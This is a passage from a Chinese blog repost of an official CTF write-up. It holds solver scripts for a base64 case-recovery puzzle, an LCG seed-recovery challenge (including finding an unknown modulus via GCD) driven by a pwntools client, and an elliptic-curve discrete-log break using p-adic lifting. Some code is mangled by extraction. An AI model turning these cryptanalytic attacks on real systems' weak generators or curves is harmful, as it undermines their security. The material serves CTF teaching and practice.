res]))</span><br><span class="line">zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi</span><br><span class="line">import string</span><br><span class="line">from base64 import * </span><br><span class="line"></span><br><span class="line">ss=set(&#x27;abcdef&#x27;+string.digits+&#x27;flag&#123;&#125;-&#x27;)</span><br><span class="line">text1=&#x27;zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi&#x27;   #因为数量不多,我们尝试用耳朵听出来</span><br><span class="line"></span><br><span class="line">def alls(text):</span><br><span class="line">    res=[&quot;&quot;]</span><br><span class="line">    for i in (text):</span><br><span class="line">        if not i.isalpha():</span><br><span class="line">            for j in range(len(res)):</span><br><span class="line">                res[j] += i</span><br><span class="line">        else:</span><br><span class="line">            for k in range(len(res)):</span><br><span class="line">                tmp = res[k]</span><br><span class="line">                res[k] += i.lower()</span><br><span class="line">                res.append(tmp + i.upper())</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">for i in range(0,len(text1),4):</span><br><span class="line">    t=(text1[i:i+4])</span><br><span class="line">    res=alls(t)</span><br><span class="line">    for j in res:</span><br><span class="line">        try:</span><br><span class="line">            tmp=b64decode(j.encode()).decode()</span><br><span class="line">            if set(tmp).issubset(ss):  #字符串是0-9a-fflag&#123;&#125;-的子集的话,即uuid格式</span><br><span class="line">                print(tmp,end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">except Exception as e:</span><br><span class="line">            continue</span><br><span class="line"># print(tmp)</span><br><span class="line">已知a,b,N,num1</span><br><span class="line">num1 = (seed *a + b ) % N</span><br><span class="line">由于b比N小则</span><br><span class="line">num1 - b = seed * a % N</span><br><span class="line">由于取模，则需要模数逆推</span><br><span class="line">seed = (num1-b)*inverse(a,N)%N</span><br><span class="line">def solve1(N,a,b,n1):</span><br><span class="line">    return (n1-b)*inverse(a,N) % N</span><br><span class="line">已知a,N,num1,num2</span><br><span class="line">需要先通过num1,num2求出b</span><br><span class="line">由于num2 = (num1 *a + b ) % N</span><br><span class="line">b = (n2-n1 * a)%N</span><br><span class="line">然后再带入def solve1()就行</span><br><span class="line">def solve2(N,a,n1,n2):</span><br><span class="line">    b = (n2-n1 * a)%N</span><br><span class="line">    return solve1(N,a,b,n1)</span><br><span class="line">这次只知道num1,num2,num3,N</span><br><span class="line">需要求出a然后带入solve2中求出b</span><br><span class="line">num3 = (num2*a + b) %N</span><br><span class="line">num2 = (num1*a + b) %N</span><br><span class="line">-&gt;</span><br><span class="line">num3-b = num2*a % N</span><br><span class="line">num2-b = num1*a % N</span><br><span class="line">-&gt;</span><br><span class="line">num3 - num2 = num2*a % N - num1*a %N</span><br><span class="line">-&gt;</span><br><span class="line">num3 - num2 = a*(num2-num1) % N</span><br><span class="line">-&gt;</span><br><span class="line">a = (num3-num2)*inverse(num2-num1,N) %N</span><br><span class="line">def solve3(N,n1,n2,n3):</span><br><span class="line">    a = (n3-n2)*inverse(n2-n1,N) %N</span><br><span class="line">    return solve2(N,a,n1,n2)</span><br><span class="line">只知道6个连续的随机数,这次就不能用线性方程组了,因为对与每一个方程,它的模数都是未知的.</span><br><span class="line">5个方程就会多出5个未知数</span><br><span class="line">但是如果多个随机数分别乘n,那么gcd就可能等于n</span><br><span class="line">我们可以设置几个模0式,然后进行gcd运算,可以在模数未知的情况下通过多个未知数序列算出模数</span><br><span class="line"></span><br><span class="line">跟solve3有类似的地方</span><br><span class="line">s1 = num2-num1 -&gt;(num2*a+b) -(num1*a+b) = a*(num2-num1) = a*s1 %N</span><br><span class="line">s2 = num3-num2 -&gt;(num3*a+b) -(num2*a+b) = a*(num3-num2) = a*s2 %N</span><br><span class="line">s3 = num4-num3</span><br><span class="line">s4 = num5-num4</span><br><span class="line">s5 = num6-num5</span><br><span class="line">那么t1-6就有共同的模数</span><br><span class="line">再做出模0式,可以互乘再做差</span><br><span class="line">t3*t1-t2**2</span><br><span class="line">t5*t2-t4*t3</span><br><span class="line">然后进行gcd求n</span><br><span class="line">N = GCD(t3*t1-t2**2,t5*t2-t4*t3)</span><br><span class="line">但是此时的N不一定是素数,只是接近true_N,那么就可以用光滑阶进行求解</span><br><span class="line">F = factorint(N)</span><br><span class="line">F.items() -&gt; p,q</span><br><span class="line">N = N / pow(p,q)</span><br><span class="line">def solve4(num1,num2,num3,num4,num5,num6):</span><br><span class="line">    s1 = num2-num1</span><br><span class="line">    s2 = num3-num2</span><br><span class="line">    s3 = num4-num3</span><br><span class="line">    s4 = num5-num4</span><br><span class="line">    s5 = num6-num5</span><br><span class="line">    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)</span><br><span class="line">    F = factorint(N)</span><br><span class="line">    while 1:</span><br><span class="line">        if isPrime(int(N)):</span><br><span class="line">            return solve3(N,num1,num2,num3)</span><br><span class="line">        else:</span><br><span class="line">            for p,q in F.items():</span><br><span class="line">                if p.bit_length()&gt;128:</span><br><span class="line">                    continue</span><br><span class="line">                N = N/pow(p,q)</span><br><span class="line">from pwn import *</span><br><span class="line">from sympy import factorint</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">    #io = remote(&quot;0.0.0.0&quot;,10000)</span><br><span class="line"></span><br><span class="line">def solve1(N,a,b,num1):</span><br><span class="line">    return (num1-b)*inverse(a,N) % N</span><br><span class="line">def solve2(N,a,num1,num2):</span><br><span class="line">    b = (num2-num1 * a)%N</span><br><span class="line">    return solve1(N,a,b,num1)</span><br><span class="line">def solve3(N,num1,num2,num3):</span><br><span class="line">    a = (num3-num2)*inverse(num2-num1,N) %N</span><br><span class="line">    return solve2(N,a,num1,num2)</span><br><span class="line">def solve4(num1,num2,num3,num4,num5,num6):</span><br><span class="line">    s1 = num2-num1</span><br><span class="line">    s2 = num3-num2</span><br><span class="line">    s3 = num4-num3</span><br><span class="line">    s4 = num5-num4</span><br><span class="line">    s5 = num6-num5</span><br><span class="line">    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)</span><br><span class="line">    F = factorint(N)</span><br><span class="line">    while 1:</span><br><span class="line">        if isPrime(int(N)):</span><br><span class="line">            return solve3(N,num1,num2,num3)</span><br><span class="line">        else:</span><br><span class="line">            for p,q in F.items():</span><br><span class="line">                if p.bit_length()&gt;128:</span><br><span class="line">                    continue</span><br><span class="line">                N = N/pow(p,q)</span><br><span class="line"></span><br><span class="line">def challenge1():</span><br><span class="line">    io.recvuntil(&quot;a=&quot;)</span><br><span class="line">    a = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;b=&quot;)</span><br><span class="line">    b = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;N=&quot;)</span><br><span class="line">    N = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num1=&quot;)</span><br><span class="line">    num1 = int(io.recvline().strip())</span><br><span class="line">    seed = solve1(N,a,b,num1)</span><br><span class="line">    io.recvuntil(&quot;seed = &quot;)</span><br><span class="line">    io.sendline(str(seed))</span><br><span class="line"></span><br><span class="line">def challenge2():</span><br><span class="line">    io.recvuntil(&quot;a=&quot;)</span><br><span class="line">    a = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;N=&quot;)</span><br><span class="line">    N = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num1=&quot;)</span><br><span class="line">    num1 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num2=&quot;)</span><br><span class="line">    num2 = int(io.recvline().strip())</span><br><span class="line">    seed = solve2(N,a,num1,num2)</span><br><span class="line">    io.recvuntil(&quot;seed = &quot;)</span><br><span class="line">    io.sendline(str(seed))</span><br><span class="line"></span><br><span class="line">def challenge3():</span><br><span class="line">    io.recvuntil(&quot;N=&quot;)</span><br><span class="line">    N = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num1=&quot;)</span><br><span class="line">    num1 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num2=&quot;)</span><br><span class="line">    num2 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num3=&quot;)</span><br><span class="line">    num3 = int(io.recvline().strip())</span><br><span class="line">    seed = solve3(N,num1,num2,num3)</span><br><span class="line">    io.recvuntil(&quot;seed = &quot;)</span><br><span class="line">    io.sendline(str(seed))</span><br><span class="line"></span><br><span class="line">def challenge4():</span><br><span class="line">    io.recvuntil(&quot;num1=&quot;)</span><br><span class="line">    num1 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num2=&quot;)</span><br><span class="line">    num2 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num3=&quot;)</span><br><span class="line">    num3 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num4=&quot;)</span><br><span class="line">    num4 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num5=&quot;)</span><br><span class="line">    num5 = int(io.recvline().strip())</span><br><span class="line">    io.recvuntil(&quot;num6=&quot;)</span><br><span class="line">    num6 = int(io.recvline().strip())</span><br><span class="line">    seed = solve4(num1,num2,num3,num4,num5,num6)</span><br><span class="line">    io.recvuntil(&quot;seed = &quot;)</span><br><span class="line">    io.sendline(str(seed))</span><br><span class="line">for i in range(50):</span><br><span class="line">    challenge1()</span><br><span class="line">    print(i)</span><br><span class="line">for i in range(30):</span><br><span class="line">    challenge2()</span><br><span class="line">    print(i)</span><br><span class="line">for i in range(20):</span><br><span class="line">    challenge3()</span><br><span class="line">    print(i)</span><br><span class="line">challenge4()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = 101202160159081561029549739902097099275439197324107563340103725793005952286427</span><br><span class="line">a = 77352628233208904456190113484930965015529164818065903310716894212030514274681</span><br><span class="line">g = 60481606253840272416608492349866939317114665311741132450767745324720776050313</span><br><span class="line"></span><br><span class="line">with open(&#x27;output.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    G = eval(data[0])</span><br><span class="line">    Q = eval(data[1])</span><br><span class="line">    leak = eval(data[2])</span><br><span class="line"></span><br><span class="line">Qpp = Qp(p, prec=666)</span><br><span class="line">s2 = (Qpp(leak).log() / Qpp(g).log()).lift()</span><br><span class="line">print(long_to_bytes(s2))</span><br><span class="line"></span><br><span class="line">b = (G[1]^2 - G[0]^3 - a*G[0]) % p^5</span><br><span class="line"></span><br><span class="line">Fp5 = Zmod(p^5)</span><br><span class="line">E = EllipticCurve(Fp5, [a, b])</span><br><span class="line"></span><br><span class="line">p_ord = E.change_ring(GF(p)).order()</span><br><span class="line"></span><br><span class="line">EQp = E.change_ring(Qp(p))</span><br><span class="line">QpG = EQp(G) * p_ord</span><br><span class="line">QpQ = EQp(Q) * p_ord</span><br><span class="line"></span><br><span class="line">phiG = -QpG[0] / QpG[1]</span><br><span class="line">phiQ = -QpQ[0] / QpQ[1]</span><br><span class="line"></span><br><span class="line">s1 = ZZ(phiQ / phiG)</span><br><span class="line">print(long_to_bytes(s1))</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/76054.html](https://www.ctfiot.com/76054.html)
+> 仓库原文：[CTF大赛WP集合/articles/官方WP（一）｜“华为杯”第一届中国研究生网络安全创新大赛实网对抗赛初赛.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E5%AE%98%E6%96%B9WP%EF%BC%88%E4%B8%80%EF%BC%89%EF%BD%9C%E2%80%9C%E5%8D%8E%E4%B8%BA%E6%9D%AF%E2%80%9D%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%AE%9E%E7%BD%91%E5%AF%B9%E6%8A%97%E8%B5%9B%E5%88%9D%E8%B5%9B.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hashCode%E7%BB%95%E8%BF%87/">hashCode绕过</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Misc/%E5%AE%89%E5%BE%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%94%BB%E9%98%B2%E8%B5%9BWriteUp/" title="安徽大学生攻防赛 WriteUp - EDI安全"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">安徽大学生攻防赛 WriteUp - EDI安全</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Misc/%E5%AE%98%E6%96%B9WP-%E4%BA%8C-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%AE%9E%E7%BD%91%E5%AF%B9%E6%8A%97%E8%B5%9B%E5%88%9D%E8%B5%9B/" title="华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛(二)官方WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛(二)官方WP</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
